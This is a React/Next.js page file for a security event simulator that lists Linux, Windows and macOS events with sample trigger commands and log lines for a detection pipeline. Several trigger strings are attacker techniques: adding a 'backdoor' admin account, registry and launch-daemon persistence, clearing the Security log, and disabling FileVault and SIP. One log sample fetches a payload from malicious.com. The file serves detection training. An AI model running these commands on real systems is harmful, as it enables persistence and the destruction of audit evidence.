"use client";

import { Header } from "@/components/header";
import { Button } from "@/components/ui/button";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { WebGLBackground } from "@/components/webgl-background";
import { 
  ShieldAlert, 
  KeyRound, 
  Terminal, 
  Flame, 
  Server, 
  Cpu, 
  Usb, 
  UserX, 
  Network, 
  Lock,
  Play,
  ChevronRight,
  AlertTriangle,
  CheckCircle,
  Loader2,
  Monitor,
  HardDrive,
  FileWarning,
  Shield,
  Bug,
  Wifi,
  Power,
  Settings,
  Database,
  Eye,
  FileCode,
  Fingerprint
} from "lucide-react";

type OS = "linux" | "windows" | "mac";

interface SecurityEventType {
  id: string;
  name: string;
  description: string;
  severity: "info" | "warning" | "error" | "critical";
  icon: React.ElementType;
  category: string;
  eventType: string;
  triggerCode: string;
  rawLogExample: string;
  detectsAlert?: string;
  os: OS;
}

const securityEvents: SecurityEventType[] = [
  // === LINUX EVENTS ===
  {
    id: "linux-ssh-brute-force",
    name: "SSH Brute Force Attack",
    description: "Simulate multiple failed SSH login attempts from a malicious IP",
    severity: "critical",
    icon: KeyRound,
    category: "Authentication",
    eventType: "AUTH_FAILURE",
    triggerCode: "for i in {1..6}; do ssh -o ConnectTimeout=2 invalid_user@localhost; done",
    rawLogExample: "Jan 15 14:32:01 prod-web-01 sshd[12345]: Failed password for invalid user hacker from 218.92.0.107 port 54321 ssh2",
    detectsAlert: "Brute Force Attack",
    os: "linux"
  },
  {
    id: "linux-ssh-success",
    name: "Successful SSH Login",
    description: "Simulate a successful SSH authentication",
    severity: "info",
    icon: CheckCircle,
    category: "Authentication",
    eventType: "AUTH_SUCCESS",
    triggerCode: "ssh user@server",
    rawLogExample: "Jan 15 14:35:22 prod-web-01 sshd[12346]: Accepted password for admin from 10.0.0.5 port 22 ssh2",
    os: "linux"
  },
  {
    id: "linux-sudo-failure",
    name: "Failed Sudo Attempt",
    description: "Simulate unauthorized privilege escalation attempt",
    severity: "warning",
    icon: Lock,
    category: "Privilege Escalation",
    eventType: "SUDO_FAILURE",
    triggerCode: "sudo -u root id # Enter wrong password 3 times",
    rawLogExample: "Jan 15 14:40:15 prod-web-01 sudo: pam_unix(sudo:auth): authentication failure; logname=www-data uid=33",
    detectsAlert: "Privilege Escalation Attempt",
    os: "linux"
  },
  {
    id: "linux-sudo-success",
    name: "Successful Sudo Command",
    description: "Execute a privileged command successfully",
    severity: "info",
    icon: Terminal,
    category: "Privilege Escalation",
    eventType: "SUDO_SUCCESS",
    triggerCode: "sudo whoami",
    rawLogExample: "Jan 15 14:42:30 prod-web-01 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
    os: "linux"
  },
  {
    id: "linux-firewall-block",
    name: "Firewall Block",
    description: "Blocked incoming connection attempt",
    severity: "warning",
    icon: Flame,
    category: "Network",
    eventType: "FIREWALL_BLOCK",
    triggerCode: "nc -zv target_ip 23",
    rawLogExample: "Jan 15 14:45:00 fw-edge-01 kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.34 DST=10.0.0.1 PROTO=TCP DPT=22",
    detectsAlert: "Port Scan Detected",
    os: "linux"
  },
  {
    id: "linux-port-scan",
    name: "Port Scan Attack",
    description: "Rapid scanning of multiple ports from same IP",
    severity: "critical",
    icon: Network,
    category: "Network",
    eventType: "FIREWALL_BLOCK",
    triggerCode: "nmap -sS -p 1-1000 target_ip",
    rawLogExample: "Jan 15 14:50:00 fw-edge-01 kernel: [UFW BLOCK] IN=eth0 SRC=45.155.205.233 DST=10.0.0.1 PROTO=TCP DPT=443",
    detectsAlert: "Port Scan Detected",
    os: "linux"
  },
  {
    id: "linux-service-start",
    name: "Service Started",
    description: "System service was started",
    severity: "info",
    icon: Server,
    category: "System",
    eventType: "SERVICE_START",
    triggerCode: "sudo systemctl start nginx",
    rawLogExample: "Jan 15 14:55:00 prod-web-01 systemd[1]: Started The NGINX HTTP and reverse proxy server.",
    os: "linux"
  },
  {
    id: "linux-service-failure",
    name: "Service Failure",
    description: "Critical service failed to start or crashed",
    severity: "error",
    icon: AlertTriangle,
    category: "System",
    eventType: "SERVICE_FAILURE",
    triggerCode: "sudo systemctl start nginx # with invalid config",
    rawLogExample: "Jan 15 15:00:00 prod-web-01 systemd[1]: Failed to start The NGINX HTTP and reverse proxy server.",
    detectsAlert: "Service Failure",
    os: "linux"
  },
  {
    id: "linux-kernel-oom",
    name: "Out of Memory Kill",
    description: "Kernel killed a process due to memory exhaustion",
    severity: "critical",
    icon: Cpu,
    category: "Kernel",
    eventType: "KERNEL_OOM",
    triggerCode: "stress --vm 1 --vm-bytes $(awk '/MemFree/{print $2}' /proc/meminfo)k",
    rawLogExample: "Jan 15 15:05:00 prod-api-02 kernel: Out of memory: Kill process 4567 (java) score 950",
    detectsAlert: "System Instability",
    os: "linux"
  },
  {
    id: "linux-usb-device",
    name: "USB Device Connected",
    description: "New USB device was connected to the system",
    severity: "info",
    icon: Usb,
    category: "Hardware",
    eventType: "USB_DEVICE_CONNECTED",
    triggerCode: "# Physical: Plug in a USB device",
    rawLogExample: "Jan 15 15:10:00 workstation kernel: usb 1-1: new high-speed USB device number 5 using xhci_hcd",
    os: "linux"
  },
  {
    id: "linux-user-created",
    name: "New User Created",
    description: "A new user account was created on the system",
    severity: "warning",
    icon: UserX,
    category: "User Management",
    eventType: "USER_CREATED",
    triggerCode: "sudo useradd -m newuser",
    rawLogExample: "Jan 15 15:15:00 prod-web-01 useradd[5678]: new user: name=backdoor, UID=1001, GID=1001",
    os: "linux"
  },
  {
    id: "linux-selinux-denial",
    name: "SELinux Denial",
    description: "SELinux policy denied an operation",
    severity: "warning",
    icon: Shield,
    category: "Security Policy",
    eventType: "SELINUX_DENIAL",
    triggerCode: "chcon -t httpd_sys_content_t /var/www/html",
    rawLogExample: "audit: type=AVC msg=audit(1642248000.123:456): avc: denied { read } for pid=1234 comm=\"httpd\" name=\"index.html\" dev=\"sda1\" ino=789",
    detectsAlert: "Security Policy Violation",
    os: "linux"
  },
  {
    id: "linux-cron-failed",
    name: "Cron Job Failed",
    description: "Scheduled cron job failed to execute",
    severity: "error",
    icon: Settings,
    category: "System",
    eventType: "CRON_FAILURE",
    triggerCode: "crontab -e # Add invalid command",
    rawLogExample: "Jan 15 15:30:00 prod-web-01 CRON[6789]: (root) CMD (/usr/local/bin/backup.sh) FAILED exit code 1",
    detectsAlert: "Scheduled Task Failure",
    os: "linux"
  },
  {
    id: "linux-disk-full",
    name: "Disk Space Critical",
    description: "Disk usage exceeded critical threshold",
    severity: "critical",
    icon: HardDrive,
    category: "System",
    eventType: "DISK_FULL",
    triggerCode: "dd if=/dev/zero of=/tmp/fill bs=1G count=100",
    rawLogExample: "Jan 15 15:35:00 prod-db-01 systemd[1]: /dev/sda1: filesystem is 95% full",
    detectsAlert: "Disk Space Critical",
    os: "linux"
  },
  {
    id: "linux-package-install",
    name: "Package Installed",
    description: "Software package was installed via package manager",
    severity: "info",
    icon: Database,
    category: "Software",
    eventType: "PACKAGE_INSTALL",
    triggerCode: "sudo apt install nginx",
    rawLogExample: "Jan 15 15:40:00 prod-web-01 apt[7890]: Installed: nginx (1.18.0-0ubuntu1)",
    os: "linux"
  },
  {
    id: "linux-file-integrity",
    name: "File Integrity Violation",
    description: "Critical system file was modified",
    severity: "critical",
    icon: FileWarning,
    category: "Security",
    eventType: "FILE_INTEGRITY_VIOLATION",
    triggerCode: "echo 'malicious' >> /etc/passwd",
    rawLogExample: "Jan 15 15:45:00 prod-web-01 aide[8901]: AIDE found differences between database and filesystem!! File: /etc/passwd",
    detectsAlert: "File Integrity Violation",
    os: "linux"
  },
  // === WINDOWS EVENTS ===
  {
    id: "windows-login-failure",
    name: "Windows Login Failure",
    description: "Failed attempt to log into Windows",
    severity: "warning",
    icon: KeyRound,
    category: "Authentication",
    eventType: "WIN_LOGIN_FAILURE",
    triggerCode: "runas /user:invaliduser cmd # Enter wrong password",
    rawLogExample: "Event ID 4625: An account failed to log on. Subject: Security ID: NULL SID Account Name: SYSTEM Logon Type: 10",
    detectsAlert: "Brute Force Attack",
    os: "windows"
  },
  {
    id: "windows-login-success",
    name: "Windows Login Success",
    description: "Successful Windows authentication",
    severity: "info",
    icon: CheckCircle,
    category: "Authentication",
    eventType: "WIN_LOGIN_SUCCESS",
    triggerCode: "runas /user:admin cmd",
    rawLogExample: "Event ID 4624: An account was successfully logged on. Subject: Security ID: SYSTEM Account Name: admin Logon Type: 2",
    os: "windows"
  },
  {
    id: "windows-rdp-failure",
    name: "RDP Login Failure",
    description: "Failed Remote Desktop connection attempt",
    severity: "critical",
    icon: Monitor,
    category: "Remote Access",
    eventType: "RDP_FAILURE",
    triggerCode: "mstsc /v:target_ip # Enter wrong credentials",
    rawLogExample: "Event ID 4625: An account failed to log on. Logon Type: 10 (RemoteInteractive) Source Network Address: 218.92.0.107",
    detectsAlert: "RDP Brute Force Attack",
    os: "windows"
  },
  {
    id: "windows-rdp-success",
    name: "RDP Login Success",
    description: "Successful Remote Desktop connection",
    severity: "info",
    icon: Monitor,
    category: "Remote Access",
    eventType: "RDP_SUCCESS",
    triggerCode: "mstsc /v:target_ip",
    rawLogExample: "Event ID 4624: An account was successfully logged on. Logon Type: 10 (RemoteInteractive) Source Network Address: 10.0.0.5",
    os: "windows"
  },
  {
    id: "windows-privilege-escalation",
    name: "Privilege Escalation",
    description: "User elevated privileges via UAC or runas",
    severity: "warning",
    icon: Lock,
    category: "Privilege Escalation",
    eventType: "WIN_PRIVILEGE_USE",
    triggerCode: "runas /user:administrator cmd",
    rawLogExample: "Event ID 4672: Special privileges assigned to new logon. Subject: Security ID: DOMAIN\\admin Privileges: SeDebugPrivilege, SeBackupPrivilege",
    detectsAlert: "Privilege Escalation Attempt",
    os: "windows"
  },
  {
    id: "windows-service-install",
    name: "Service Installed",
    description: "New Windows service was installed",
    severity: "warning",
    icon: Server,
    category: "System",
    eventType: "WIN_SERVICE_INSTALL",
    triggerCode: "sc create malicious binPath=C:\\malware.exe",
    rawLogExample: "Event ID 7045: A service was installed in the system. Service Name: SuspiciousService Service File Name: C:\\Windows\\Temp\\malware.exe",
    detectsAlert: "Suspicious Service Installation",
    os: "windows"
  },
  {
    id: "windows-powershell-exec",
    name: "PowerShell Script Execution",
    description: "PowerShell script was executed",
    severity: "info",
    icon: Terminal,
    category: "Process",
    eventType: "WIN_POWERSHELL_EXEC",
    triggerCode: "powershell -ExecutionPolicy Bypass -File script.ps1",
    rawLogExample: "Event ID 4104: Script block logging. Creating Scriptblock text (1 of 1): Invoke-WebRequest -Uri http://malicious.com/payload.exe",
    os: "windows"
  },
  {
    id: "windows-suspicious-powershell",
    name: "Suspicious PowerShell Activity",
    description: "PowerShell executed with suspicious parameters",
    severity: "critical",
    icon: Bug,
    category: "Process",
    eventType: "WIN_SUSPICIOUS_PS",
    triggerCode: "powershell -EncodedCommand <base64>",
    rawLogExample: "Event ID 4688: A new process has been created. Process Name: powershell.exe Command Line: -nop -w hidden -encodedcommand",
    detectsAlert: "Suspicious PowerShell Activity",
    os: "windows"
  },
  {
    id: "windows-firewall-change",
    name: "Windows Firewall Rule Changed",
    description: "Windows Firewall configuration was modified",
    severity: "warning",
    icon: Flame,
    category: "Network",
    eventType: "WIN_FIREWALL_CHANGE",
    triggerCode: "netsh advfirewall firewall add rule name=\"Allow All\" dir=in action=allow",
    rawLogExample: "Event ID 4946: A change has been made to Windows Firewall exception list. Rule Added: Allow All Direction: Inbound",
    detectsAlert: "Firewall Configuration Change",
    os: "windows"
  },
  {
    id: "windows-defender-alert",
    name: "Windows Defender Alert",
    description: "Windows Defender detected malware",
    severity: "critical",
    icon: Shield,
    category: "Security",
    eventType: "WIN_DEFENDER_ALERT",
    triggerCode: "# Download EICAR test file",
    rawLogExample: "Event ID 1116: Windows Defender detected malware. Threat Name: Trojan:Win32/Emotet Action: Quarantine Status: Success",
    detectsAlert: "Malware Detected",
    os: "windows"
  },
  {
    id: "windows-audit-log-clear",
    name: "Security Log Cleared",
    description: "Windows Security event log was cleared",
    severity: "critical",
    icon: FileWarning,
    category: "Security",
    eventType: "WIN_LOG_CLEARED",
    triggerCode: "wevtutil cl Security",
    rawLogExample: "Event ID 1102: The audit log was cleared. Subject: Security ID: DOMAIN\\admin Account Name: admin",
    detectsAlert: "Audit Log Tampering",
    os: "windows"
  },
  {
    id: "windows-scheduled-task",
    name: "Scheduled Task Created",
    description: "New scheduled task was created",
    severity: "warning",
    icon: Settings,
    category: "System",
    eventType: "WIN_TASK_CREATED",
    triggerCode: "schtasks /create /tn \"Malicious\" /tr C:\\payload.exe /sc onstart",
    rawLogExample: "Event ID 4698: A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\Malicious Task Content: <Actions><Exec><Command>C:\\payload.exe</Command></Exec></Actions>",
    detectsAlert: "Suspicious Scheduled Task",
    os: "windows"
  },
  {
    id: "windows-user-created",
    name: "User Account Created",
    description: "New local user account was created",
    severity: "warning",
    icon: UserX,
    category: "User Management",
    eventType: "WIN_USER_CREATED",
    triggerCode: "net user backdoor P@ssw0rd /add",
    rawLogExample: "Event ID 4720: A user account was created. Subject: Security ID: DOMAIN\\admin New Account: Account Name: backdoor",
    detectsAlert: "Unauthorized User Creation",
    os: "windows"
  },
  {
    id: "windows-admin-added",
    name: "User Added to Admins",
    description: "User was added to local Administrators group",
    severity: "critical",
    icon: Lock,
    category: "User Management",
    eventType: "WIN_ADMIN_ADDED",
    triggerCode: "net localgroup administrators backdoor /add",
    rawLogExample: "Event ID 4732: A member was added to a security-enabled local group. Group Name: Administrators Member: backdoor",
    detectsAlert: "Privilege Escalation",
    os: "windows"
  },
  {
    id: "windows-process-injection",
    name: "Process Injection Detected",
    description: "Suspicious process injection activity detected",
    severity: "critical",
    icon: Bug,
    category: "Process",
    eventType: "WIN_PROCESS_INJECTION",
    triggerCode: "# Mimikatz or similar tool",
    rawLogExample: "Event ID 10: Process accessed. SourceImage: C:\\mimikatz.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1010",
    detectsAlert: "Process Injection Attack",
    os: "windows"
  },
  {
    id: "windows-registry-persist",
    name: "Registry Persistence",
    description: "Suspicious registry key added for persistence",
    severity: "critical",
    icon: FileCode,
    category: "Security",
    eventType: "WIN_REGISTRY_PERSIST",
    triggerCode: "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /d C:\\malware.exe",
    rawLogExample: "Event ID 13: Registry value set. EventType: SetValue TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware Details: C:\\malware.exe",
    detectsAlert: "Persistence Mechanism Detected",
    os: "windows"
  },
  // === MACOS EVENTS ===
  {
    id: "mac-login-failure",
    name: "macOS Login Failure",
    description: "Failed authentication attempt on macOS",
    severity: "warning",
    icon: KeyRound,
    category: "Authentication",
    eventType: "MAC_LOGIN_FAILURE",
    triggerCode: "su invaliduser # Enter wrong password",
    rawLogExample: "Feb 10 09:15:32 MacBook-Pro authorizationhost[1234]: PAM: authentication error for login from invaliduser",
    detectsAlert: "Brute Force Attack",
    os: "mac"
  },
  {
    id: "mac-login-success",
    name: "macOS Login Success",
    description: "Successful macOS authentication",
    severity: "info",
    icon: CheckCircle,
    category: "Authentication",
    eventType: "MAC_LOGIN_SUCCESS",
    triggerCode: "login",
    rawLogExample: "Feb 10 09:20:15 MacBook-Pro authorizationhost[1235]: authenticated successfully",
    os: "mac"
  },
  {
    id: "mac-ssh-failure",
    name: "SSH Authentication Failed",
    description: "Failed SSH login attempt on macOS",
    severity: "critical",
    icon: KeyRound,
    category: "Authentication",
    eventType: "MAC_SSH_FAILURE",
    triggerCode: "ssh invalid@localhost",
    rawLogExample: "Feb 10 09:25:00 MacBook-Pro sshd[1236]: Failed password for invalid from 218.92.0.107 port 54321 ssh2",
    detectsAlert: "SSH Brute Force Attack",
    os: "mac"
  },
  {
    id: "mac-sudo-failure",
    name: "Failed Sudo Attempt",
    description: "Unauthorized sudo attempt on macOS",
    severity: "warning",
    icon: Lock,
    category: "Privilege Escalation",
    eventType: "MAC_SUDO_FAILURE",
    triggerCode: "sudo -u root id # Enter wrong password",
    rawLogExample: "Feb 10 09:30:00 MacBook-Pro sudo[1237]: user : 3 incorrect password attempts ; TTY=ttys000 ; PWD=/Users/user ; USER=root ; COMMAND=/usr/bin/id",
    detectsAlert: "Privilege Escalation Attempt",
    os: "mac"
  },
  {
    id: "mac-sudo-success",
    name: "Successful Sudo",
    description: "Successful sudo command execution on macOS",
    severity: "info",
    icon: Terminal,
    category: "Privilege Escalation",
    eventType: "MAC_SUDO_SUCCESS",
    triggerCode: "sudo whoami",
    rawLogExample: "Feb 10 09:35:00 MacBook-Pro sudo[1238]: developer : TTY=ttys000 ; PWD=/Users/developer ; USER=root ; COMMAND=/usr/bin/whoami",
    os: "mac"
  },
  {
    id: "mac-gatekeeper-block",
    name: "Gatekeeper Blocked App",
    description: "Gatekeeper prevented unsigned app from running",
    severity: "warning",
    icon: Shield,
    category: "Security Policy",
    eventType: "MAC_GATEKEEPER_BLOCK",
    triggerCode: "open /path/to/unsigned.app",
    rawLogExample: "Feb 10 09:40:00 MacBook-Pro kernel[0]: AMFI: code signature validation failed for '/Applications/unsigned.app/Contents/MacOS/unsigned'",
    detectsAlert: "Unsigned Application Blocked",
    os: "mac"
  },
  {
    id: "mac-xprotect-alert",
    name: "XProtect Malware Detection",
    description: "XProtect detected potential malware",
    severity: "critical",
    icon: Bug,
    category: "Security",
    eventType: "MAC_XPROTECT_ALERT",
    triggerCode: "# Download known malware",
    rawLogExample: "Feb 10 09:45:00 MacBook-Pro XProtect[1239]: Malware detected: OSX.MacOffers.A Path: /Users/user/Downloads/malware.dmg Action: Quarantine",
    detectsAlert: "Malware Detected",
    os: "mac"
  },
  {
    id: "mac-firewall-block",
    name: "Application Firewall Block",
    description: "macOS Application Firewall blocked connection",
    severity: "warning",
    icon: Flame,
    category: "Network",
    eventType: "MAC_FIREWALL_BLOCK",
    triggerCode: "# Enable firewall and run unsigned app",
    rawLogExample: "Feb 10 09:50:00 MacBook-Pro socketfilterfw[1240]: Deny nc connecting from port 443 to port 12345 proto=6",
    detectsAlert: "Firewall Block",
    os: "mac"
  },
  {
    id: "mac-screen-sharing",
    name: "Screen Sharing Started",
    description: "Remote screen sharing session was initiated",
    severity: "info",
    icon: Monitor,
    category: "Remote Access",
    eventType: "MAC_SCREEN_SHARING",
    triggerCode: "# Enable Screen Sharing in System Preferences",
    rawLogExample: "Feb 10 10:00:00 MacBook-Pro screensharingd[1241]: Authentication succeeded for user 'admin' from 10.0.0.5",
    os: "mac"
  },
  {
    id: "mac-keychain-access",
    name: "Keychain Access Attempt",
    description: "Application attempted to access Keychain",
    severity: "warning",
    icon: KeyRound,
    category: "Security",
    eventType: "MAC_KEYCHAIN_ACCESS",
    triggerCode: "security find-generic-password -s \"WiFi\"",
    rawLogExample: "Feb 10 10:05:00 MacBook-Pro securityd[1242]: SecKeychain: com.apple.security.keychain-access-groups denied for /Applications/SuspiciousApp.app",
    detectsAlert: "Suspicious Keychain Access",
    os: "mac"
  },
  {
    id: "mac-tcc-request",
    name: "TCC Permission Request",
    description: "Application requested privacy permission",
    severity: "info",
    icon: Eye,
    category: "Privacy",
    eventType: "MAC_TCC_REQUEST",
    triggerCode: "# App requests Camera/Microphone access",
    rawLogExample: "Feb 10 10:10:00 MacBook-Pro tccd[1243]: Request: com.example.app for kTCCServiceCamera Decision: Denied",
    os: "mac"
  },
  {
    id: "mac-disk-mount",
    name: "External Disk Mounted",
    description: "External storage device was mounted",
    severity: "info",
    icon: HardDrive,
    category: "Hardware",
    eventType: "MAC_DISK_MOUNT",
    triggerCode: "# Connect external drive",
    rawLogExample: "Feb 10 10:15:00 MacBook-Pro diskarbitrationd[1244]: disk2s1 mounted at /Volumes/USB_DRIVE",
    os: "mac"
  },
  {
    id: "mac-launch-daemon",
    name: "Launch Daemon Installed",
    description: "New launch daemon was installed (persistence)",
    severity: "critical",
    icon: FileCode,
    category: "Security",
    eventType: "MAC_LAUNCH_DAEMON",
    triggerCode: "sudo cp malware.plist /Library/LaunchDaemons/",
    rawLogExample: "Feb 10 10:20:00 MacBook-Pro launchd[1]: Loaded: /Library/LaunchDaemons/com.malware.agent.plist",
    detectsAlert: "Persistence Mechanism Detected",
    os: "mac"
  },
  {
    id: "mac-user-created",
    name: "User Account Created",
    description: "New user account created on macOS",
    severity: "warning",
    icon: UserX,
    category: "User Management",
    eventType: "MAC_USER_CREATED",
    triggerCode: "sudo sysadminctl -addUser backdoor -password pass123",
    rawLogExample: "Feb 10 10:25:00 MacBook-Pro sysadminctl[1245]: New user 'backdoor' created with UID 502",
    detectsAlert: "Unauthorized User Creation",
    os: "mac"
  },
  {
    id: "mac-admin-added",
    name: "User Added to Admin Group",
    description: "User was added to admin group on macOS",
    severity: "critical",
    icon: Lock,
    category: "User Management",
    eventType: "MAC_ADMIN_ADDED",
    triggerCode: "sudo dseditgroup -o edit -a backdoor -t user admin",
    rawLogExample: "Feb 10 10:30:00 MacBook-Pro opendirectoryd[1246]: User 'backdoor' added to group 'admin'",
    detectsAlert: "Privilege Escalation",
    os: "mac"
  },
  {
    id: "mac-filevault-disabled",
    name: "FileVault Disabled",
    description: "FileVault disk encryption was disabled",
    severity: "critical",
    icon: HardDrive,
    category: "Security",
    eventType: "MAC_FILEVAULT_DISABLED",
    triggerCode: "sudo fdesetup disable",
    rawLogExample: "Feb 10 10:35:00 MacBook-Pro fdesetup[1247]: FileVault has been disabled on disk0s2",
    detectsAlert: "Encryption Disabled",
    os: "mac"
  },
  {
    id: "mac-wifi-connect",
    name: "WiFi Network Connected",
    description: "Connected to a WiFi network",
    severity: "info",
    icon: Wifi,
    category: "Network",
    eventType: "MAC_WIFI_CONNECT",
    triggerCode: "# Connect to WiFi",
    rawLogExample: "Feb 10 10:40:00 MacBook-Pro airportd[1248]: Associated with 'CoffeeShop_WiFi' BSSID: AA:BB:CC:DD:EE:FF",
    os: "mac"
  },
  {
    id: "mac-sip-status",
    name: "SIP Status Changed",
    description: "System Integrity Protection status was modified",
    severity: "critical",
    icon: Shield,
    category: "Security",
    eventType: "MAC_SIP_CHANGED",
    triggerCode: "csrutil disable # In Recovery Mode",
    rawLogExample: "Feb 10 10:45:00 MacBook-Pro kernel[0]: System Integrity Protection status: disabled",
    detectsAlert: "SIP Disabled",
    os: "mac"
  },
  {
    id: "mac-app-crash",
    name: "Application Crash",
    description: "Application crashed unexpectedly",
    severity: "error",
    icon: AlertTriangle,
    category: "System",
    eventType: "MAC_APP_CRASH",
    triggerCode: "kill -SEGV $PID",
    rawLogExample: "Feb 10 10:50:00 MacBook-Pro ReportCrash[1249]: Saved crash report for Safari[1250] version 15.0 to /Users/user/Library/Logs/DiagnosticReports/",
    os: "mac"
  },
  {
    id: "mac-touchid-failure",
    name: "Touch ID Failed",
    description: "Touch ID authentication failed",
    severity: "warning",
    icon: Fingerprint,
    category: "Authentication",
    eventType: "MAC_TOUCHID_FAILURE",
    triggerCode: "# Use wrong finger on Touch ID",
    rawLogExample: "Feb 10 10:55:00 MacBook-Pro biometrickitd[1251]: Fingerprint match failed after 3 attempts for user 'admin'",
    detectsAlert: "Biometric Auth Failure",
    os: "mac"
  },
  {
    id: "mac-kernel-panic",
    name: "Kernel Panic",
    description: "System experienced a kernel panic",
    severity: "critical",
    icon: Power,
    category: "Kernel",
    eventType: "MAC_KERNEL_PANIC",
    triggerCode: "# Kernel extension conflict",
    rawLogExample: "Feb 10 11:00:00 MacBook-Pro kernel[0]: Kernel panic - not syncing: Fatal exception in interrupt",
    detectsAlert: "System Instability",
    os: "mac"
  }
];

const severityColors = {
  info: "bg-cyan-500/10 text-cyan-400 border-cyan-500/30",
  warning: "bg-amber-500/10 text-amber-400 border-amber-500/30",
  error: "bg-red-500/10 text-red-400 border-red-500/30",
  critical: "bg-fuchsia-500/10 text-fuchsia-400 border-fuchsia-500/30"
};

const categoryColors: Record<string, string> = {
  "Authentication": "bg-cyan-500/10 text-cyan-400",
  "Privilege Escalation": "bg-orange-500/10 text-orange-400",
  "Network": "bg-violet-500/10 text-violet-400",
  "System": "bg-primary/10 text-primary",
  "Kernel": "bg-rose-500/10 text-rose-400",
  "Hardware": "bg-slate-500/10 text-slate-400",
  "User Management": "bg-yellow-500/10 text-yellow-400",
  "Security Policy": "bg-indigo-500/10 text-indigo-400",
  "Software": "bg-teal-500/10 text-teal-400",
  "Security": "bg-red-500/10 text-red-400",
  "Remote Access": "bg-purple-500/10 text-purple-400",
  "Process": "bg-lime-500/10 text-lime-400",
  "Privacy": "bg-pink-500/10 text-pink-400"
};

const osInfo = {
  linux: { name: "Linux", icon: "🐧", color: "bg-orange-500/10 text-orange-400 border-orange-500/30" },
  windows: { name: "Windows", icon: "🪟", color: "bg-blue-500/10 text-blue-400 border-blue-500/30" },
  mac: { name: "macOS", icon: "🍎", color: "bg-slate-500/10 text-slate-300 border-slate-500/30" }
};

export default function SimulatePage() {
  const router = useRouter();
  const [loadingEvent, setLoadingEvent] = useState<string | null>(null);
  const [lastTriggered, setLastTriggered] = useState<{id: string; eventId: string} | null>(null);
  const [selectedCategory, setSelectedCategory] = useState<string>("all");
  const [selectedOS, setSelectedOS] = useState<OS | "all">("all");

  const categories = ["all", ...Array.from(new Set(securityEvents.map(e => e.category)))];

  const filteredEvents = securityEvents.filter(e => {
    const matchesCategory = selectedCategory === "all" || e.category === selectedCategory;
    const matchesOS = selectedOS === "all" || e.os === selectedOS;
    return matchesCategory && matchesOS;
  });

  const triggerEvent = async (event: SecurityEventType) => {
    setLoadingEvent(event.id);
    try {
      const response = await fetch("/api/events/trigger", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          eventTypeId: event.id,
          eventType: event.eventType,
          severity: event.severity,
          rawLogExample: event.rawLogExample,
          detectsAlert: event.detectsAlert,
          os: event.os
        })
      });
      
      const data = await response.json();
      if (data.success) {
        setLastTriggered({ id: event.id, eventId: data.event.id });
        setTimeout(() => setLastTriggered(null), 3000);
      }
    } catch (error) {
      console.error("Failed to trigger event:", error);
    } finally {
      setLoadingEvent(null);
    }
  };

  const viewEventDetails = (event: SecurityEventType) => {
    router.push(`/simulate/${event.id}`);
  };

  return (
    <div className="min-h-screen relative">
      <WebGLBackground />
      <Header />
      
      <main className="container px-4 py-8 relative z-10">
        <div className="mb-8">
          <div className="flex items-center gap-3 mb-2">
            <div className="p-2 bg-primary/20 rounded-lg border border-primary/30 pulse-glow">
              <ShieldAlert className="h-6 w-6 text-primary" />
            </div>
            <h1 className="text-3xl font-bold glow-text">Security Event Simulator</h1>
          </div>
          <p className="text-muted-foreground terminal-text">
            Click to trigger security events. Each event flows through: Log → Parse → Analyze → Alert
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2 mb-4">
          <span className="text-sm font-medium text-muted-foreground mr-2 terminal-text">Operating System:</span>
          <Button
            variant={selectedOS === "all" ? "default" : "outline"}
            size="sm"
            onClick={() => setSelectedOS("all")}
            className={selectedOS === "all" ? "bg-primary text-primary-foreground" : "border-primary/30 hover:bg-primary/10"}
          >
            All
          </Button>
          {(["linux", "windows", "mac"] as OS[]).map(os => (
            <Button
              key={os}
              variant={selectedOS === os ? "default" : "outline"}
              size="sm"
              onClick={() => setSelectedOS(os)}
              className={`gap-1.5 ${selectedOS === os ? "bg-primary text-primary-foreground" : "border-primary/30 hover:bg-primary/10"}`}
            >
              <span>{osInfo[os].icon}</span>
              {osInfo[os].name}
            </Button>
          ))}
        </div>

        <div className="flex gap-2 mb-6 flex-wrap">
          <span className="text-sm font-medium text-muted-foreground mr-2 self-center terminal-text">Category:</span>
          {categories.map(cat => (
            <Button
              key={cat}
              variant={selectedCategory === cat ? "default" : "outline"}
              size="sm"
              onClick={() => setSelectedCategory(cat)}
              className={`capitalize ${selectedCategory === cat ? "bg-primary text-primary-foreground" : "border-primary/30 hover:bg-primary/10"}`}
            >
              {cat}
            </Button>
          ))}
        </div>

        <div className="mb-4 text-sm text-muted-foreground terminal-text">
          Showing {filteredEvents.length} event{filteredEvents.length !== 1 ? 's' : ''}
        </div>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
          {filteredEvents.map((event) => {
            const Icon = event.icon;
            const isLoading = loadingEvent === event.id;
            const wasTriggered = lastTriggered?.id === event.id;

            return (
              <div
                key={event.id}
                className={`relative p-5 rounded-xl glass-card transition-all duration-300 ${
                  wasTriggered ? "ring-2 ring-primary border-primary" : "hover:border-primary/40"
                }`}
              >
                {wasTriggered && (
                  <div className="absolute top-2 right-2 flex items-center gap-1 text-xs text-primary animate-pulse glow-text">
                    <CheckCircle className="h-3.5 w-3.5" />
                    Triggered!
                  </div>
                )}

                <div className="flex items-start gap-3 mb-3">
                  <div className={`p-2.5 rounded-lg border ${severityColors[event.severity]}`}>
                    <Icon className="h-5 w-5" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="font-semibold text-sm mb-1 truncate">{event.name}</h3>
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className={`inline-block px-2 py-0.5 text-xs rounded-full ${categoryColors[event.category] || categoryColors["Security"]}`}>
                        {event.category}
                      </span>
                      <span className={`inline-block px-2 py-0.5 text-xs rounded-full border ${osInfo[event.os].color}`}>
                        {osInfo[event.os].icon} {osInfo[event.os].name}
                      </span>
                    </div>
                  </div>
                </div>

                <p className="text-xs text-muted-foreground mb-4 line-clamp-2">
                  {event.description}
                </p>

                <div className="flex items-center gap-2 text-xs text-muted-foreground mb-4 flex-wrap">
                  <span className={`px-2 py-0.5 rounded border ${severityColors[event.severity]}`}>
                    {event.severity}
